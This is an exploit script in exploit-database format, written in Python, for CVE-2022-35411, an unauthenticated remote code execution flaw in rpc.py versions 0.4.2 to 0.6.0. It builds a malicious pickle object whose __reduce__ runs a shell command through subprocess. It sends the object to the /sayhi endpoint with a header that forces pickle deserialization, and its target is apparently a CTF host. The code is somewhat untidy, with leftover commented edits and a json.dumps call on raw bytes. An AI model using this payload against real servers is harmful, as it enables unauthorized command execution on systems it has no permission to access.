# Exploit Title: rpc.py 0.6.0 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 2022-07-12
# Exploit Author: Elias Hohl
# Vendor Homepage: https://github.com/abersheeran
# Software Link: https://github.com/abersheeran/rpc.py
# Version: v0.4.2 - v0.6.0
# Tested on: Debian 11, Ubuntu 20.04
# CVE : CVE-2022-35411

import requests
import pickle
import json

# Unauthenticated RCE 0-day for https://github.com/abersheeran/rpc.py

# HOST =3D "127.0.0.1:65432"
HOST ="organic-sauerkraut.c.ctf-snyk.io"

URL =f"http://{HOST}/sayhi"

HEADERS ={
    # "accept": "application/x-pickle",
    "serializer": "pickle",
    # "Content-Type": "application/x-pickle"
    "accept": "application/json",
    # "serializer": "json",
    "Content-Type": "application/json"
}


def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import subprocess
            return subprocess.check_output, (cmd,)

    payload = pickle.dumps(PickleRce())

    # print(payload)
    # import base64
    # print(base64.urlsafe_b64encode(payload))

    # return base64.urlsafe_b64encode(payload)
    return payload


def exec_command(cmd):

    payload =generate_payload(cmd)
    # data = {"name": payload}
    data = {"name": "Pranav"}
    print(URL)
    print(data)
    print(HEADERS)

    response = requests.post(url=URL, data=json.dumps({"name": payload}), headers=HEADERS)
    # response = requests.post(url=URL, data={"name": "Pranav"}, headers=HEADERS)
    print(response)


def main():
    exec_command('whoami')
    # exec_command('curl http://127.0.0.1:4321')
    # exec_command('uname -a')


if __name__ == "__main__":
    main()
